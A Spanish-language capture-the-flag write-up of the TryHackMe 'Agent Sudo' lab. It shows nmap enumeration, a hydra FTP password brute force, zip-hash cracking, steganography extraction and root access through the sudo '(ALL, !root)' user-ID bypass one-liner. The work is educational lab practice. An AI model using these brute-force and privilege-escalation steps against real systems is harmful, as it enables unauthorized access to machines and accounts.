---
title: TryHackMe Agent Sudo Writeup
published: true
---

La máquina Agent Sudo, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean, así como el user.txt y el root.txt

# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar los puertos abiertos:

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
❯ nmap -p- --open --min-rate 5000 -T5 -n -vvv -Pn 10.10.11.79
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-26 14:09 EDT
Initiating Connect Scan at 14:09
Scanning 10.10.11.79 [65535 ports]
Discovered open port 80/tcp on 10.10.11.79
Discovered open port 22/tcp on 10.10.11.79
Discovered open port 21/tcp on 10.10.11.79
Completed Connect Scan at 14:09, 23.63s elapsed (65535 total ports)
Nmap scan report for 10.10.11.79
Host is up, received user-set (0.064s latency).
Scanned at 2023-03-26 14:09:35 EDT for 23s
Not shown: 42735 filtered tcp ports (no-response), 22797 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds
```

El escaneo nos reporta tres puertos abiertos, el 21, el 22 y el 80, así como el servicio que corre en cada uno de ellos.

Ananalizamos la versión y servicio de estos puertos mediante nmap para sacar más información:

```bash
> nmap -p21,22,80 -sCV -Pn -n 10.10.11.79
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
```

# []($header-1)Acceso al sistema

Acccedemos mediante el navegador web a la IP-VICTIMA porque el puerto 80 está abierto y nos muestra el siguiente mensaje:

> Dear agents, Use your own codename as user-agent to access the site. From, Agent R 

Si inspeccionamos la página nos reporta que tenemos que cambiar el user-agent a C para acceder al sitio.

Mediante el pluggin user agent switch podemos introducir C en el apartado de user agent y al refrescar la página nos reporta otra información:

> Attention chris, Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! From, Agent R

-Esto lo podríamos haber hecho con BurpSuite-

Obtenemos un potencial usuario del que sabemos que tiene una contraseña floja. Por ello, intentamos con hydra conectarnos mediante ftp al usuario chris para ver si nos consigue reportar alguna contraseña:

```bash
❯ hydra -l chris -P /home/jorge/Descargas/rockyou.txt ftp://10.10.11.79
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-26 14:16:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries (l:1/p:14344401), ~896526 tries per task
[DATA] attacking ftp://10.10.11.79:21/
[21][ftp] host: 10.10.11.79   login: chris   password: ???????
[STATUS] 14344401.00 tries/min, 14344401 tries in 00:01h, 1 to do in 00:01h, 15 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-26 14:17:26

```

Obtenemos la contraseña para chris. Nos logeamos y conseguimos tres archivos, dos imágenes y un archivo .txt

```bash
❯ ftp 10.10.11.79
Connected to 10.10.11.79.
220 (vsFTPd 3.0.3)
Name (10.10.11.79:jorge): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||9859|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||15661|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |**********************************************|   217        2.55 MiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (2.79 KiB/s)
ftp> get 
To_agentJ.txt   cute-alien.jpg  cutie.png
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||16430|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |**********************************************| 33143      327.82 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (178.93 KiB/s)
ftp> get cut
cute-alien.jpg  cutie.png
ftp> get cutie.png
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||43706|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |**********************************************| 34842      338.21 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (202.90 KiB/s)
```
```bash
❯ cat To_agentJ.txt
───────┬───────────────────────────────────────────────────────────────────────────────────
       │ File: To_agentJ.txt
───────┼───────────────────────────────────────────────────────────────────────────────────
   1   │ Dear agent J,
   2   │ 
   3   │ All these alien like photos are fake! Agent R stored the real picture inside your 
       │ directory. Your login password is somehow stored in the fake picture. It shouldn't
       │  be a problem for you.
   4   │ 
   5   │ From,
   6   │ Agent C

```

Nos dice que dentro de alguna de las imágenes se encuentra la contraseña.

Mediante 7z podemos observar que la imagen cutie.png es la que contiene un archivo .txt:

```bash
❯ 7z l cutie.png

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs 11th Gen Intel(R) Core(TM) i5-11400F @ 2.60GHz (A0671),ASM,AES-NI)

Scanning the drive for archives:
1 file, 34842 bytes (35 KiB)

Listing archive: cutie.png

--
Path = cutie.png
Type = zip
Offset = 34562
Physical Size = 280

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2019-10-29 08:29:11 .....           86           98  To_agentR.txt
------------------- ----- ------------ ------------  ------------------------
2019-10-29 08:29:11                 86           98  1 files

```

Intentamos extraer la imagen pero hay una contraseña:

```bash
❯ 7z x cutie.png

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs 11th Gen Intel(R) Core(TM) i5-11400F @ 2.60GHz (A0671),ASM,AES-NI)

Scanning the drive for archives:
1 file, 34842 bytes (35 KiB)

Extracting archive: cutie.png
--
Path = cutie.png
Type = zip
Offset = 34562
Physical Size = 280

    
Enter password (will not be echoed):
ERROR: Wrong password : To_agentR.txt
                    
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1

```

Vemos que hay un archivo .zip, usaremos binwalk para extraer cutie.png:

```bash
❯ cd _cutie.png.extracted
❯ ls
 365   365.zlib   8702.zip  
```

Crackeamos con zip2john el archivo .zip y usamos john para crackear el hash:

```bash
❯ zip2john 8702.zip > hash.txt
❯ john hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
???????          (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE 2/3 (2023-03-26 14:38) 1.298g/s 57719p/s 57719c/s 57719C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Tenemos la contraseña para descomprimir el archivo .zip mediante 7z con:

> 7z x 8702.zip

Nos reporta un archivo .txt que dice lo siguiente:

```bash
❯ ls
 365   365.zlib   8702.zip   hash   hash.txt   To_agentR.txt
❯ cat To_agentR.txt
───────┬───────────────────────────────────────────────────────────────────────────────────
       │ File: To_agentR.txt
───────┼───────────────────────────────────────────────────────────────────────────────────
   1   │ Agent C,
   2   │ 
   3   │ We need to send the picture to 'QXJlYTUx' as soon as possible!
   4   │ 
   5   │ By,
   6   │ Agent R
───────┴───────────────────────────────────────────────────────────────────────────────────
```

Usaremos <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=UVhKbFlUVXg">CyberChef</a> para decodear el mensaje.

Tenemos una posible contraseña y el único archivo que nos queda es cute-alien.jpg, lo extraemos con steghide y la contraseña obtenida:

```bash
❯ steghide extract -sf cute-alien.jpg
Anotar salvoconducto: 
anot� los datos extra�dos e/"message.txt".
❯ ls
 _cutie.png.extracted   cute-alien.jpg   message.txt
 binwalk                cutie.png        To_agentJ.txt
❯ cat message.txt
───────┬───────────────────────────────────────────────────────────────────────────────────
       │ File: message.txt
───────┼───────────────────────────────────────────────────────────────────────────────────
   1   │ Hi james,
   2   │ 
   3   │ Glad you find this message. Your login password is hackerrules!
   4   │ 
   5   │ Don't ask me why the password look cheesy, ask agent R who set this password for y
       │ ou.
   6   │ 
   7   │ Your buddy,
   8   │ chris
───────┴───────────────────────────────────────────────────────────────────────────────────
```

Tenemos un potencial usuario con una contraseña por lo que nos conectamos mediante ssh y adquirimos la flag del usuario. Por otro lado, para respoder a una de las preguntas de la room de TryHackMe deberemos de obtener la imagen que nos reporta y buscarla en google para localizar como se llama el suceso que representa la imagen:

```bash
❯ ssh james@10.10.11.79
The authenticity of host '10.10.11.79 (10.10.11.79)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.79' (ED25519) to the list of known hosts.
james@10.10.11.79's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar 26 17:31:08 UTC 2023

  System load:  0.0               Processes:           97
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 34%               IP address for eth0: 10.10.11.79
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
????????????????????
```

Si buscamos la imagen en google observamos que el suceso es: Roswell Alien Autopsy

# []($header-1)Escalada de privilegios

En cuanto a la escalada de privilegios, hacemos sudo -l para ver qué comandos podemos ejecutar como sudo:

```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Sorry, try again.
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

```

Buscamos (ALL, !root) para localizar que se trata de una vulnerabilidad para las versiones inferiores a 1.8.28 de sudo en la que ejecutando un comando obtenemos ser root:

```bash
james@agent-sudo:~$ sudo -u \#$((0xffffffff)) /bin/bash
[sudo] password for james: 
root@agent-sudo:~# whoami
root
root@agent-sudo:~# ls
Alien_autospy.jpg  user_flag.txt
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
????????????????????????????????

By,
DesKel a.k.a Agent R
```

Obtenemos así la flag de root y el nombre de Agent R.

Muchas gracias por leer este Writeup. Espero que te haya gustado mucho!
